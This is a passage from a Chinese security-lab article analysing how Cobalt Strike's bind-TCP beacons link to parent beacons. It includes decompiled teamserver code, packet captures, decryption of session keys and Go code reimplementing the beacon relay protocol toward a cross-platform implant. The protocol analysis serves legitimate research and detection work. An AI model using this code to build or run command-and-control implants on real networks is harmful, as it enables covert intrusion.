        //成功连接到横向bind beacon    if (var10 != null) {        this.pipes.register(var1 + "", childBeaconID + "");        if (var10.getInternal() == null) {            this.getCheckinListener().output(BeaconOutput.Output(var1, "established link to child " + CommonUtils.session(childBeaconID)));            this.getResources().archive(BeaconOutput.Activity(var1, "established link to child " + CommonUtils.session(childBeaconID)));        } else {            this.getCheckinListener().output(BeaconOutput.Output(var1, "established link to child " + CommonUtils.session(childBeaconID) + ": " + var10.getInternal()));            this.getResources().archive(BeaconOutput.Activity(var1, "established link to child " + CommonUtils.session(childBeaconID) + ": " + var10.getComputer()));        }  
            this.getCheckinListener().output(BeaconOutput.Output(var10.getId(), "established link to parent " + CommonUtils.session(var1) + ": " + var9.getInternal()));        this.getResources().archive(BeaconOutput.Activity(var10.getId(), "established link to parent " + CommonUtils.session(var1) + ": " + var9.getComputer()));    }}

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134459.png)

  

 **3.1.1 验证解析数据**

  

这里我们采用抓包一个http beacon和一个bindtcp beacon连接上线的方式，进行抓包验证。

  

http beacon：172.16.247.2，bindtcp beacon：172.16.247.10

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134500.png)

  

1\. 获取bindtcp beacon的源数据

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134501.png)

  

其中id为10进制的beaconid：1919872472，对应的16进制为：726EEDD8。

  

2\. 我们在http beacon上抓取172.16.247.10到172.16.247.2的数据包，可以成功抓到bindtcp beacon
的上线源数据包，如下：

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134505.png)

  * 

    
    
    d8ed6e72 16260b3d109719765a05bb700c998d6ca7578735042f3de458170fc22ebc681450cd06c82abb35fa4d11bef0b4d19d7d1c2018b1b6fccf9b35f47b751cbebfa903bb9f28de526fcf8d26b2f6def6952a0aab74970bfee5934cce36352be4111850856dee7e55df4ab04ab5e5bc8ed2991d3a7e477ad276b31a0373fbebe2e557

  

长度为132，即4字节的小端的beaconid+128字节的rsa加密的源数据。但是我们上面分析的bindtcp beacon中间还有一个hint值呢？

  

2.抓取172.16.247.2到ts的connect任务结果包

  

我们解密这个任务包获得子beacon对应的上线源数据包，然后查看二者差异。

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134507.png)

  

3\. 使用http/https beacon的aes和hashmac解密这个数据（记得去除prepend和append）

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134508.png)

  

  * 

    
    
    726eedd8 0010115c 16260b3d109719765a05bb700c998d6ca7578735042f3de458170fc22ebc681450cd06c82abb35fa4d11bef0b4d19d7d1c2018b1b6fccf9b35f47b751cbebfa903bb9f28de526fcf8d26b2f6def6952a0aab74970bfee5934cce36352be4111850856dee7e55df4ab04ab5e5bc8ed2991d3a7e477ad276b31a0373fbebe2e557

  

这里我们通过对比两个包，发现父beacon的connect会对子beacon返回的数据做一些操作，包括：

  * 小端beacon id变为大端beacon id

  * 在beacon id和rsa加密源数据之间插入4字节的hint值

  

4\. 使用上面解析源数据的python脚本，解析上线的源数据

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134509.png)

  

3.1.2 golang模拟connect命令封包

  

我们使用golang模拟这个过程：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    //绑定子beaconid和对应tcp socket的关系//fmt.Println("[+] Connect recv: ",fmt.Sprintf("%x",data))clientIDBytes := data[:4]childBID := util.BytesToUint32(clientIDBytes)//fmt.Println("[+] Child beacon id: ",fmt.Sprintf("%x",childBID))config.Connects.Store(childBID, config.ChildBeacon{Server: server, ChildConn: childConn})  
    //插入hint值hint := 65536^uint32(port)hintBytes := make([]byte,4)binary.BigEndian.PutUint32(hintBytes,uint32(hint));  
    //小端beaconid变大端beaconidAddBytes := make([]byte, 4)binary.BigEndian.PutUint32(AddBytes,childBID)  
    endData := util.BytesCombine(AddBytes,hintBytes,data[4:])//fmt.Println("[+] Send up: ",fmt.Sprintf("%x",endData))

  

3.1.3 关于hint

  

这里我们父beacon为什么需要向收到的子beacon的数据中插入这个hint，它又是如何生成的呢？

  

在common/PivotHint.java中，我们可以看到对hint这个值的应用：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public class PivotHint {    public static final long HINT_REVERSE = 65536L;    public static final long HINT_FORWARD = 0L;    public static final long HINT_PROTO_PIPE = 0L;    public static final long HINT_PROTO_TCP = 1048576L;    protected int hint;  
        public PivotHint(int var1) {        this.hint = var1;    }  
        public PivotHint(String var1) {        this.hint = CommonUtils.toNumber(var1, 0);    }  
        public int getPort() {        return this.hint & '\uffff'; //hint值的后4位表示一个端口    }  
        public boolean isReverse() {        return ((long)this.hint & 65536L) == 65536L;//hint值的第4位的最后一个bit用来判断回连和转发    }  
        public boolean isForward() {        return !this.isReverse();    }  
        public boolean isTCP() {        return ((long)this.hint & 1048576L) == 1048576L;//hint值的第3位的最后一个bit用来判断tcp还是smb    }  
        public String getProtocol() {        return this.isTCP() ? "TCP" : "SMB";    }  
        public String toString() {        return this.isForward() ? this.getPort() + ", " + this.getProtocol() + " (FWD)" : this.getPort() + ", " + this.getProtocol() + " (RVR)";    }}

  

我们来解析上面实验的hint值：0010115c

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134510.png)

  

hint的第3位的最后一个bit为1，表示它是一个tcp的数据包。

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134512.png)

  

最后4位对应的port值为：4444，为子beacon对应的监听端口。

  

 **3.2 解析bindtcp task返回数据**

  

通过http/https beacon的分析我们知道process_beacon_data函数是处理task返回数据的函数，其中我
们在这个函数中还找到它对自己的递归调用，如下：

  *   *   *   *   *   *   *   *   * 

    
    
    if (taskType == 12) { //子beacon返回信息    childBeaconID = var5.readInt();//beaconid    childBeaconData = CommonUtils.readAll(var5); //task返回数据(len+aes加密后的数据)    if (childBeaconData.length > 0) {        this.process_beacon_data(childBeaconID + "", childBeaconData);    }  
        this.getCheckinListener().update(childBeaconID + "", System.currentTimeMillis(), (String)null, false);}

  

由上我们bindtcp beacon返回的任务数据的格式为：

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134513.png)

  

3.2.1 验证解析数据

  

1\. 在172.16.247.10上执行cs命令

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134514.png)

  

2\. 在172.16.247.2上抓172.16.247.10到172.16.247.2的包

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134515.png)

  

如图，我们可以看到172.16.247.10发送给172.16.247.2的一次task任务的数据包是3个。第一个包的数据：

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134516.png)

  

表示任务返回数据的长度，这里是0x0714，10进制为：1812

  

第二个包和第三个包是任务返回数据：

![](https://gitee.com/fuli009/images/raw/master/public/20220218134517.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220218134518.png)

  

1460+352 = 1812，刚好是第一个包的数据。实际任务返回数据就是将两个包连接：

  * 

    
    
    000007101c430e118c822ec0aac3857c0d08b9d64d34905d76ea850a85f5ee2496cc0e2c4675fb2e 2c18562cc0422034f28221e0a45d6ecb3cb55e347ca9743cf4766f58ddfea7a82edc0e41ae5e5382 5d9552a4acd009c2210d6db1baf999421b69c1e69986213cf2fbbb4b0202a8d59ccfe07814415e07 66ec8b33e2839f1284ee956a5ad2c24eb07d9c7d82737ea5dcc0bdbd0222100e82a09bf3ad46ad96 d200cda2b017d779070022a21bc09c9970d9af538a68bd88f08391a8d4027a9bbddcfe9f451f643e a3e302549792137a1e9a7c7ded5303210fe0271710e4d5a857662f0ce250d34e4e329b83c7d5d558 0ed33dd73cc39811d26e24e4757744dd1efcdf3da4a23008a5067ee60179496cd62b5977ac487af4 fac686714605e00e66e3db292dd9a46246e765c8cb0037d39fa4f0bdb0de97bd3bad42f10e2e4b6e ce0cf07d56c15a51b592c3c0d57e33a215ebfe2cf43999f01aab0e965059eb54fc872d1f2696c992 6446ad09fb1db8b3eae8a9d1a6ca700033eae1c1d79a21beb38276ceb669b8a3a63015861d43acbe e918c321f60ed2e659350db48f13998609cbd66970ae15dda6c245e122484353907462ab50723064 4550f0b8cbec1727cd7340e85c037c8dd02a51c09df80fabc31502841c08648da74095388b6aefa3 8407777048d9c3fafa81da8493795d32efe911439085c0462e835848a170f619d4d12a335735c0fc 348df9ef65a3c6ec27b7b374446656dc15802fe22e5668314fe19147ace8508fff999fb9d1b2cf42 0dbf75936989dc7beb19daddb8279e567f207550c379db2ec243aa9447f5ce13a97b9d3b21259714 2c3e5135b0e0a875b328f75b062e7ea16e80727853c35c4a51d2322fb5d9f7c0bc5bdd1c13d14e43 f59828ac7a27ae597822de379b75d424b3809c5cff021a452685d3735016b82e6c1946da53fdc445 5ac92b0eb33f1b6ce8eca73a4c029b81674006c317bde4e44e0f233be4d6bb57453b56e94af95d73 408267949b5a6ce91746435b4bfd4eeb8c7fc7451421eb3a8b2e38b07f13a6863988af60b9e6d8f6 8ffafa0ae3e44b20ac52b5bb2d5ecbbbaf34e823dbc5ff1f5d7e93f631a065af90e5e6d4ff135d74 31153c0e62f5947b0a163e50b718e28a09304b49f0d41afdf34cf1e2c9093f28797306fe47210b7b afd377afb76f9b39c24327347af88788fb753f8161f514e47a46c2cf4b4da00547f9b892b124553a 7fa5b39a99bd75e1d77f5d07d9cddfbe722e99e5ceb33cc773ffadb51cdaf0bb21d998d4a1b318f8 70ab2dd5e704bf24aa09902b2844624256b3ed5c3af6b054c44dc9d356bea01211b11b500cae765c 1b1ff47ea6cf5652ba042d778ab6941c0afbf03f7609e9ea2235f2cfd3858f2da48282affe375876 bea69c465eddf3682b19c843c4243a132480ea6f1c46d906ac26987290bfb5b35e2f42d64be46c79 fd7b2bd22ab1a62a973a4ece0d55a5fc562700dc8f6a139cf56d3bba68a1a66c25fd5b8746639d08 d3b99cfec117db3a3c7e4ea5b1aa86547f6ddae2e6ec0bc14be6abfdf2dc5862d45a2b315b26a108 fbcbb36080fe7ad1b854d81d8532602596f83aae6b328e20ea87e1d4f0647b7c76004f07fc8135fa 9b11482f3b7a85a90c9f6e91e08f086661e9140427ce546075f9e226980b8bb2465c45bbaf9a7976 2dc9de96a33e8cc1512dbfd2bbbfed7418fd9d679948092047466b60bf76d84b6c1bc2a4ef79ec42 82ad5448848bf8a4bb1df9f7bd5688ec89804cfceb450f6696964906d69e62c6310dbd8878b4064a 68bede64051f41dd427d784cd596cb36b921561fe75e6f8c43920481dd756914af1cafa79ee34bf8 448a5ab89e3a4de3665045267c4e48da07f677efe2e8a0b036d09524ecb91e7c4720bfac87099c85 1e1d23fa4fc446721e0905209982d9a2ddc40a5233e2d04317d9ceba6a09779d9e944fb5ca1ec237 9a68d1ddcdba7e31c40877cec68a5acdde9fafb57e84e6640f404acabd6e39f779c69e321718631d af8cc5dd76d79cf858deac780e8ac5637bac95ee84c6137f667a8807fe52add083203cc00cb9c112 bb839738df241e244ffe600ad3eff58f04eefdaae71faacca20e1d12f9f18e2e1250201f62918968 d615cff69db01d57007d6267d44e193e3189a761f396bbe487f941b26ac1836d85c4c2a02d094367 16011a6e4a0201b34a816a5469449049966a425ce3226d2fa90669a6305a0c5dbb0cc85688365bbf 8c88a911b378ae080810e239c43e52e09f294e7e445f5c4178bb809c887631c3c86faa8e4a8ed435 db34b2c7df9ee05b6a54c648c60d9d464f7476e16a578d0a54040b4c5abc4f23846716da3fd90736 ee8d5015220ca48c66c8bb0e73f7b0f525161e82fec27789cace323577ffc5f266128e628a0c5155 955f1786576fd1668c6fb83c0999d285306a5ed6d2e8d69df636cf917e220ba7881a69f5a313abeb 0125e00f49f59a1c5bd23443d1c4824bdc486af863b67e936a876d86ad2062141c1b2c30c3d5444a c92f4b8c9949bfdbb7ce1fe0

  

3\. 根据上线源数据获取aeskey和hashmac

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134519.png)

  

子beacon发送给父beacon的上线源数据包为：

  * 

    
    
    5e85aa3106755b9156b8f3b04fa0da72dc3740465cc0d2f45c5dd3d3d6a7496f397892c5dc5b11d7 602419647d177b5563a952f10c395c385832fedeebd119a89a3b77c32d62bf19c44f75836ab0a20e 200eaec1aace752a0690d9284b5da6402e3034f09fbc568b684e793d9983cf8601cd309bdcaa273e 6fadd95081508147f95fd914

  

按照我们上面的分析，还需要删除前面4字节的反序beaconid才是真正的上线源数据：

  * 

    
    
    06755b9156b8f3b04fa0da72dc3740465cc0d2f45c5dd3d3d6a7496f397892c5dc5b11d760241964 7d177b5563a952f10c395c385832fedeebd119a89a3b77c32d62bf19c44f75836ab0a20e200eaec1 aace752a0690d9284b5da6402e3034f09fbc568b684e793d9983cf8601cd309bdcaa273e6fadd950 81508147f95fd914

  

然后使用解密源数据的python脚本解密：

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134520.png)

  

获得AES key和Hashmac

  *   * 

    
    
    AES key:9b933592951d47b2ae93e339b640e92d HMAC key:8fa971e3d5950a7ff0d5f4fca898c8ae

  

4\. 根据bindtcp beacon源数据获得aes key解密bindtcp beacon返回的任务数据

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134521.png)

  

如上图，与我们cs执行命令返回的结果一致。

  

3.2.2 golang模拟发送请求

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    func BeaconLive(cmdBuf []byte)  {    childBID := binary.BigEndian.Uint32(cmdBuf)    value,ok := config.Connects.Load(childBID)    if ok{        childBeacon,ok := value.(config.ChildBeacon)        if ok{            childConn := childBeacon.ChildConn            if len(cmdBuf) == 4{                packet.WriteData(childConn, nil)            }else {                packet.WriteData(childConn, cmdBuf[4:])            }  
                data,err := packet.ReadData(childConn)            if err!= nil{                if err.Error() == "EOF"{                    Unlink(cmdBuf[:4])                }else {                    finalPacket := packet.MakePacket(13,[]byte(err.Error()))                    packet.WriteData(config.ParentConn,finalPacket)                }            }else if data == nil { //心跳成功返回                childBIDBytes := util.Uint32ToBytes(childBID)                finalPacket := packet.MakePacket(12,childBIDBytes) //返回数据到上一层时添加子beaconid                packet.WriteData(config.ParentConn, finalPacket)            } else {                childBIDBytes := util.Uint32ToBytes(childBID)                endData := util.BytesCombine(childBIDBytes, data)//返回数据到上一层时添加子beaconid                finalPacket := packet.MakePacket(12,endData)                packet.WriteData(config.ParentConn, finalPacket)            }        }    }}

  

  

 **0x04 跨平台的bindtcp Beacon**

  

根据上面的分析，我们总结出bindtcp流程如下：

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134523.png)

  

 **4.1 子beacon的任务过程**

  

1\. 子beacon新建监听，初始化全局变量，比如：beaconid、AES key和HashMac等；然后等待父beacon连接。

  

2\.
建立连接之后，子beacon获取源数据组包，并使用公钥加密，然后封包小端beaconid，最后使用自定义的tcp封包格式（长度包+数据包）发往父beacon。

  

3\. 子beacon进入循环读取父beacon任务，任务分为：命令任务和心跳任务。

  

4\. 子beacon判断收到心跳任务时，向父beacon返回0x00000000，表示在线；子beacon判断收到的是命令任务，会使用AES
key解密命令，解析出实际命令分配对应的线程取执行。

  

5\.
当命令执行线程执行完命令之后，将执行结果进行任务结果的封包：包括AES加密命令结果，封装结果长度，封装Hmac等；然后使用自定义的tcp封包格式（长度包+数据包）向父beacon发送命令执行结果。

  

 **4.2 父beacon的任务过程**

  

1\. 接收连接到子beacon的任务，判断是否已经连接，如果没有，则连接子beacon监听的端口。

  

2\. 读取子beacon返回的源数据包，获取子beaconid，并将子beaconid、子beacon对应的ip、port、对应连接的tcp
socket进行绑定。

  

3\. 封包连接任务返回数据：大端beaconid+hint+rsa加密的子beacon源数据；然后再使用父beacon 的AES
key加密源数据，并封装数据长度和父beacon的hashmac。

  

4\. 如果父beacon是http/https
beacon，会对应使用模拟http请求向ts发送父beacon的连接任务数据（即子beacon的上线源数据）；如果父beacon是bind tcp
beacon，会对应使用自定义的tcp封包格式（长度包+数据包）发往父beacon的父beacon。

  

5\. 父beacon等待ts/上一级beaocn的任务，从解密的任务数据中获取子beaconid，然后根据子beacon
ID获取对应的socket，最后使用对应的socket将数据发送到子beacon。

  

6\. 然后等待子beacon返回命令执行数据，并封装上子beacon ID，然后再用父beaocn的AES key加
密，封装上数据长度和hashmac，最后发往ts/上一级beacon。

  

银河实验室

![](https://gitee.com/fuli009/images/raw/master/public/20220218134524.png)

银河实验室（GalaxyLab）是平安集团信息安全部下一个相对独立的安全实验室，主要从事安全技术研究和安全测试工作。团队内现在覆盖逆向、物联网、Web、Android、iOS、云平台区块链安全等多个安全方向。官网：http://galaxylab.pingan.com.cn/

  

  

  

往期回顾

  

技术

[【平安CTF赛题】解题思路总结](http://mp.weixin.qq.com/s?__biz=MzIzODAwMTYxNQ==&mid=2652140750&idx=1&sn=907ceb3795a13e8b54910f67e67e8938&chksm=f320d86ec4575178eec0aed8e50d4a1c4ad91aa2edfde855fcf0bfa0d80301f33459c688a07f&scene=21#wechat_redirect)  

技术  

[D-Link 816-A2
路由器研究分享](http://mp.weixin.qq.com/s?__biz=MzIzODAwMTYxNQ==&mid=2652140459&idx=1&sn=e8490313048ab72486acd1d1c9b90b45&chksm=f320df0bc457561df4ec65f626999314f28a1e977d38b35f4842d096b77159e2a9dae069155b&scene=21#wechat_redirect)  

技术

[使用Ghidra
P-Code对OLLVM控制流平坦化进行反混淆](http://mp.weixin.qq.com/s?__biz=MzIzODAwMTYxNQ==&mid=2652140336&idx=1&sn=e5d771802a5446d6599db2438fcc31f9&chksm=f320df90c457568608fced74cf80b8e234f5a5585b8462cfa13aa79f4a7f5376b2e5262692cf&scene=21#wechat_redirect)  

技术

[家用路由器D-LINK
DIR-81漏洞挖掘实例分析](http://mp.weixin.qq.com/s?__biz=MzIzODAwMTYxNQ==&mid=2652140325&idx=1&sn=2f2a67c118dd5df372babe8da310bde0&chksm=f320df85c45756939bf77d1d034d427b183407aa6afb34c61fcddbbb77c20eb171ecc1abbc17&scene=21#wechat_redirect)

公告

[防守方视角看漏扫——手把手教你定制自己的漏扫框架（POC部分）](http://mp.weixin.qq.com/s?__biz=MzIzODAwMTYxNQ==&mid=2652140540&idx=1&sn=3d872e0b97a854f5bcb31eaf7540963e&chksm=f320df5cc457564a5760d7807be2048f7420868b6394c149620de900af77caf88d1307806d99&scene=21#wechat_redirect)

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134525.png)![]()![](https://gitee.com/fuli009/images/raw/master/public/20220218134526.png)

 **长按识别二维码关注我们**

 **微信号：PSRC_Team**

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20220218134527.png)

 **球分享**

![](https://gitee.com/fuli009/images/raw/master/public/20220218134527.png)

 **球点赞**

![](https://gitee.com/fuli009/images/raw/master/public/20220218134527.png)

 **球在看**

  

  

预览时标签不可点

收录于话题 #

 个

上一篇 下一篇

阅读原文

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

【干货】cobaltstrike通信协议研究

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

